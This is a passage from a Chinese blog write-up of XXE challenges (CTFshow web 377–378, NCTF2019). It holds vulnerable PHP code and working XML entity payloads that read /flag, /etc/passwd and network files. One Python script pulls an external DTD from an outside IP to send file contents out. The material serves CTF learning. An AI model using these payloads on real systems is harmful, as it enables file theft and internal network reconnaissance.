punctuation\">;</span>    </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>相比上关增添了大小写过滤，我们同之前思路即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153151.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web-377\"><a href=\"#web-377\" class=\"headerlink\" title=\"web 377\"></a>web 377</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?xml version=\"1\\.0\"|http/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>过滤了http，这个时候我们设定一个特殊的编码方式（例:UTF-16），这样转换一下就可以实现绕过，这里的不话不用bp，用python脚本来攻击，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://95b7794d-1b60-4bfb-926c-e1bfbb955c8f.challenge.ctf.show/'</span>\ndata <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">\"\"\"&lt;!DOCTYPE ANY [\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n&lt;!ENTITY % xxe SYSTEM \"http://124.222.255.142:8083/xxe.dtd\">\n%xxe;\n%dtd;\n%send;\n] >\n&lt;xxe>1&lt;/xxe>\n\"\"\"</span>\nrequests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url <span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-16'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"done!\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>先监听，后运行脚本<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153261.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web-378\"><a href=\"#web-378\" class=\"headerlink\" title=\"web 378\"></a>web 378</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153170.png\" alt=\"在这里插入图片描述\"><br>界面类似xxe-lab，抓包看一下</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153190.png\" alt=\"在这里插入图片描述\"><br>一眼顶真，鉴定完毕，是有回显的XXE,使用file伪协议直接读取就可以</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> test<span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span>  file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///flag\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>username<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>file<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>username<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://img-blog.csdnimg.cn/b5175399266d448596618031a9fcdb8e.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"内网探测-NCTF2019-True-XML-cookbook\"><a href=\"#内网探测-NCTF2019-True-XML-cookbook\" class=\"headerlink\" title=\"内网探测([NCTF2019]True XML cookbook)\"></a>内网探测([NCTF2019]True XML cookbook)</h2><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153643.png\" alt=\"在这里插入图片描述\"><br>界面有两个输入框，随便输入后抓包<br>尝试读取文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> xml<span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> quan9i <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///flag\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>username<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>quan9i<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>username<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153712.png\" alt=\"在这里插入图片描述\"><br>发现没有flag文件，那探测探测其他的文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> xml<span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> quan9i <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///etc/passwd\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>username<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>quan9i<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>username<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://img-blog.csdnimg.cn/b6c23b70e6d94868ac8b4010f75ec239.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> xml<span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> quan9i <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///etc/hosts\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>username<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>quan9i<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>username<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153771.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> xml<span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> quan9i <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///proc/net/arp\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>user<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>username<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>quan9i<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>username<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>password<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>password<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>user<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153044.png\" alt=\"在这里插入图片描述\"><br>得到一个ip，进行内网探测<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153115.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153131.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153445.png\" alt=\"在这里插入图片描述\"><br>此时未爆破出来，说明可能不是这个，我们换<code>file:///proc/net/fib_trie</code>命令继续寻找ip<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153467.png\" alt=\"在这里插入图片描述\"><br>继续内网探测<br>设置变量<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153488.png\" alt=\"在这里插入图片描述\"><br>设置次数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153776.png\" alt=\"在这里插入图片描述\"><br>调大线程<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153818.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153852.png\" alt=\"在这里插入图片描述\"><br>得到flag</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://xz.aliyun.com/t/6754#toc-15\">https://xz.aliyun.com/t/6754</a><br><a href=\"https://xz.aliyun.com/t/3357#toc-12\">https://xz.aliyun.com/t/3357</a><br><a href=\"https://xz.aliyun.com/t/6887\">https://xz.aliyun.com/t/6887</a><br><a href=\"https://tttang.com/archive/1110/#toc_phpexpectrce\">https://tttang.com/archive/1110/#toc_phpexpectrce</a></p>\n","feature":true,"text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1716/ 前言在进行系统学习过后，对XXE进行简单总结，希望能对正在学习XXE的师傅有所帮助 前置知识XML什么是XMLXML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XML","slug":"XML","count":1,"path":"api/tags/XML.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86\"><span class=\"toc-text\">前置知识</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XML\"><span class=\"toc-text\">XML</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFXML\"><span class=\"toc-text\">什么是XML</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML%E7%9A%84%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86\"><span class=\"toc-text\">XML的组成部分</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML%E7%9A%84%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">XML的作用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99\"><span class=\"toc-text\">XML语法规则</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DTD\"><span class=\"toc-text\">DTD</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">内部引用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">外部引用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%86%85-%E5%A4%96%E5%BC%95%E7%94%A8\"><span class=\"toc-text\">内+外引用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DTD%E5%AE%9E%E4%BD%93\"><span class=\"toc-text\">DTD实体</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93\"><span class=\"toc-text\">内部实体</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93\"><span class=\"toc-text\">外部实体</span></a></li></ol></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#XXE\"><span class=\"toc-text\">XXE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%80%E4%B9%88%E6%98%AFXXE\"><span class=\"toc-text\">什么是XXE</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3\"><span class=\"toc-text\">漏洞危害</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0-1\"><span class=\"toc-text\">漏洞成因</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">XXE的利用姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6\"><span class=\"toc-text\">读取任意文件</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">有回显</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">无回显</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DOS%E6%94%BB%E5%87%BB-Denial-of-service\"><span class=\"toc-text\">DOS攻击(Denial of service)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B\"><span class=\"toc-text\">内网探测</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">靶场实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE-lab\"><span class=\"toc-text\">XXE-lab</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE-1\"><span class=\"toc-text\">有回显</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE-1\"><span class=\"toc-text\">无回显</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFshow\"><span class=\"toc-text\">CTFshow</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-373\"><span class=\"toc-text\">web 373</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-374\"><span class=\"toc-text\">web 374</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-375\"><span class=\"toc-text\">web 375</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-376\"><span class=\"toc-text\">web 376</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-377\"><span class=\"toc-text\">web 377</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web-378\"><span class=\"toc-text\">web 378</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B-NCTF2019-True-XML-cookbook\"><span class=\"toc-text\">内网探测([NCTF2019]True XML cookbook)</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"PHP Phar反序列化浅析","uid":"e6402dc9a02db5ae2c54650aafd17f57","slug":"PHP Phar反序列化浅析","date":"2022-09-14T01:36:20.000Z","updated":"2023-03-20T04:06:34.000Z","comments":true,"path":"api/articles/PHP Phar反序列化浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141530896.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1732 前言Phar反序列化是PHP反序列化的一个重要部分，进行相关学习后，简单总结如下，希望对正在学习的师傅有所帮助。 了解PharPhar含义可以认为Phar是PHP的压缩文档，是PHP中类似于J...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"PHP代码审计之旅之百家CMS","uid":"2701665bc33e3ae6e528c88e69e6e2f6","slug":"代审基础——php_bugs","date":"2022-08-11T10:10:16.000Z","updated":"2024-02-14T07:32:24.000Z","comments":true,"path":"api/articles/代审基础——php_bugs.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141532334.jpeg","text":"前言代码审计不会，学习知识需要积累一下基础，因此来搭建php_bugs进行相关学习，题解如下，希望能对在学习代码审计的师傅们有所帮助 靶场github链接如下https://github.com/bowu678/php_bugs extract变量覆盖&lt;?php $flag...","link":"","photos":[],"count_time":{"symbolsCount":"42k","symbolsTime":"38 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}